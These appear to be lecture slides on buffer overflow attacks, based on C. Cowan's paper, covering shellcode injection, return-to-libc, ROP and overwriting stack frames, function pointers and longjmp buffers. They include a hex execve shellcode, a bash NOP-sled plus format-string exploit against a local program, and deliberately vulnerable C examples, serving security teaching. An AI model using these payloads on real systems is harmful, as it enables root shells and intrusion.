class: center, middle

# Buffer Overflow
## Insights and comments about ***C. Cowan***' s paper
### (lecture 08)

---

class: middle

.right-column[
# Agenda

<pre>
Goals
├─ Code Arrangement
│  ├─ Inject
│  └─ already there
└─ Jump to it
   ├─ What will be corrupted?
   ├─ Activation Record
   ├─ Function Pointers
   └─ Longjmp buffers
</pre>
]
---

# Steps

.blockquote[
<i>
1. Arrange for suitable code to be available in the program's address
    space.<br><br>
2. Get the program to jump to that code, with suitable
    parameters loaded into registers & memory.
</i>
]

.footnote[[Buffer Overflows: Attacks and Defenses for the Vulnerability of the
Decade](https://crypto.stanford.edu/cs155/papers/cowan-vulnerability.pdf)]

---

.left-column[
# Step 1
]
.right-column[
## <em><i>a. Inject it</i></em>
## b. It is already there
]

---

.left-column[
# Step 1.a
##### what code should be injected?
]
.right-column[
<div style="padding-top: 150px"/>
- must be binary opcode (attackers can't compile)
- must be [position-independent](http://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/)
(*an additional level of indirection to all global data and function
references in the code. Code can be easily mapped into different memory addresses without
needing to change one bit.*)
]

---

.left-column[
# Step 1.a
##### what code should be injected?
##### Example
]
.right-column[
<div style="padding-top: 200px"/>
What the code really does is not important, but for historical
reasons, the code spawns a shell.
For this reason it is always called *Shellcode*.
- Very simple (naive) shellcode: `execve /bin//sh`
- Something like: `31 c9 f7 e1 b0 0b 51 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 cd 80`
(*naive, static, 21B shellcode*)

**Note:** if the executable is root *set-uid*, then you got a root
shell! Does you remember SUID bit?!
]

---

.left-column[
# Step 1.a
##### what code should be injected?
##### Example
##### Where code should be injected?
]
.right-column[
<div style="padding-top: 250px"/>
- In the same buffer (that overflow)
- In another buffer
- In an environment variable (easier to be located, very high address)
- Everywhere in memory, attackers are really creative
]

---
.left-column[
## In the buffer
]
.right-column[
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

  char buf[128];
  if(argc < 2) return 1;

  strcpy(buf, argv[1]);
  printf("%s\n", buf);

  return 0;
}
```
]

---

.left-column[
## In another buffer
]
.right-column[
```c
#include<string.h>

// The devil is in the details - nnp

void copy_buffers(char *argv[])
{
	char buf1[32], buf2[32], buf3[32];

	strncpy(buf2, argv[1], 31);
	strncpy(buf3, argv[2], sizeof(buf3));
	strcpy(buf1, buf3);
}

int main(int argc, char *argv[])
{
	copy_buffers(argv);
	return 0;
}
```
]
---

.left-column[
## In the environment
]
.right-column[
```bash
# Export the environment variable
# [NOP sledge + Shellcode]
export SH=`python -c 'print "\x90"*40000+   \
	"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e \
	 \x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3 \
	 \x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1 \
	 \xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68 \
	 \x4a\x41\x41\x43\x43\x4b\x4b\x4b\x4b"'`

# Launch the exploit
./vuln-prog `python -c 'print "\xd4\x94\x04 \
	\x08FLOW\xd6\x94\x04\x08
	%57076x%4$n%57599x%6$n"'` 1> /dev/null

```
]
---

.left-column[
# Step 1
]
.right-column[
## a. Inject it
## <em><i>b. It is already there</i></em>
]

---

.left-column[
# Step 1.b
##### Why?
]
.right-column[
<div style="padding-top: 150px"/>
- Stack smashing is hard in the presence of
  [StackGuard](https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf)
  and [StackShield](http://www.angelfire.com/sk/stackshield/)
  furthermore, it is hard to inject code when stack is *non-executable*
  (`NX` bit).
- Input vector is limited (buffer size, no environment disposable, **application firewall** ...)
- Other security mechanism like <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a><sup>1</sup>(more later)
- ...
]
.footnote[
1.[https://pax.grsecurity.net/docs/aslr.txt](https://pax.grsecurity.net/docs/aslr.txt)
]
---

.left-column[
# Step 1.b
##### Why?
##### How?
]
.right-column[
<div style="padding-top: 200px"/>
**Pointers and gadgets<sup>1</sup> are already there..**
]

.footnote[
1. The term **gadget** is improperly used. Typically in *ROP* a gadget is a
   small instruction sequences ending with a `ret` instruction `c3`. Here we use
   it to denote whatever `bytecodes sequence -> instruction` useful.
]
---

.left-column[
# Step 1.b
##### Why?
##### How?
]
.right-column[
<div style="padding-top: 200px"/>
**Pointers and gadgets<sup>1</sup> are already there..**
**Memory is not a panacea of zeros..**
]

.footnote[
1. The term **gadget** is improperly used. Typically in *ROP* a gadget is a
   small instruction sequences ending with a `ret` instruction `c3`. Here we use
   it to denote whatever `bytecodes sequence -> instruction` useful.
]
---

.left-column[
# Step 1.b
##### Why?
##### How?
]
.right-column[
<div style="padding-top: 200px"/>
**Pointers and gadgets<sup>1</sup> are already there..**
**Memory is not a panacea of zeros..**<br><br>
Common techniques that leverage this idea are:
<div style="padding-top: 25px"/>
<table border="0" cellspacing="5" cellpadding="5">
  <tr>
    <th>Technique</th>
    <th>Defeat</th>
  </tr>
  <tr><td>Return to libc</td><td right>NX bit, StackGuard</td></tr>
  <tr><td>Return to GOT </td><td right>NX bit, StackGuard</td></tr>
  <tr><td>ROP (&co)     </td><td right>NX bit, StackGuard, ASLR</td></tr>
</table>

]

.footnote[
1. The term **gadget** is improperly used. Typically in *ROP* a gadget is a
   small instruction sequences ending with a `ret` instruction `c3`. Here we use
   it to denote whatever `bytecodes sequence -> instruction` useful.
]
---

.left-column[
# Step 2
##### Jump to that code
]
<div style="padding-top: 150px"/>
.right-column[
In order to jump to the suitable code, attackers could corrupt the
normal program flow by overwriting or mangling:

- Activation records
- Function Pointers
- Longjmp buffers
]

---

.left-column[
# Step 2
##### Jump to that code
<br>
**Activation Record**
]
<div style="padding-top: 220px"/>
.right-column[
The portion of the stack used for an invocation of a function. Also called the
function's stack frame.
]

---

.left-column[
# Step 2
##### Jump to that code
<br>
**Activation Record**
]
.right-column[
```c
#include <stdio.h>
int x = 4;
void printx(void) { printf("%x\n", x); }
void foo(int y) {
	int x = 4;
	x = x + x * y;
	printx();
}
void main() {
	int z = 3;
	printx();
	foo(z);
}
```
<img src="imgs/printx.jpg" alt="stack snapshopt about the example"/>
]

.footnote[
Dynamic link (AKA Control link) points to the activation record of the caller.
]
---

.left-column[
# Step 2
##### Jump to that code
<br>
**Activation Record**
]
.right-column[
```c
void foo(char *args)
{
  char buf[256];
  strcpy(buf, args);
}
int main(int argc, char *argv[])
{
  if (argc > 1)
    foo(argv[1]);
  return 0;
}
```
<img style="padding-left:100px" src="imgs/arvuln.jpg" alt="stack snapshopt about the example"/>
]
.footnote[
[http://matthias.vallentin.net/course-work/buffer_overflows.pdf](http://matthias.vallentin.net/course-work/buffer_overflows.pdf)
]
---

.left-column[
# Step 2
##### Jump to that code
<br>
**Function pointers**
]
<div style="padding-top: 200px"/>
.right-column[
The deliberate modification of the value of a pointer is referred to as
pointer subterfuge. As these types of attacks modify directly the control flow
of the program, they are also known as control flow attacks. Originally, pointer
subterfuge attacks were developed to evade stack protection mechanisms.
]

---

.left-column[
# Step 2
##### Jump to that code
<br>
**Function pointers**
]
.right-column[
```c
void foo(void *arg, size_t len)
{
  char buf[256];
  void (*f)() = 0xdeadbeef;
  memcpy(buf, arg, len);
  f();
  return;
}
```
<img style="padding-left:100px" src="imgs/fpvuln.jpg" alt="stack snapshopt about the example"/>
]

.footnote[
[http://matthias.vallentin.net/course-work/buffer_overflows.pdf](http://matthias.vallentin.net/course-work/buffer_overflows.pdf)
]
---

.left-column[
# Step 2
##### Jump to that code
<br>
**longjmp**
]
.right-column[
<div style="padding-top: 200px"/>
We prefer to not spoil the [IO netgarage level16](https://io.netgarage.org/).
One of our favorite challenge!<br>
]
---
class: center, middle

<img src="imgs/bcat.gif" alt="A black Cat that polish his nails"/>

---
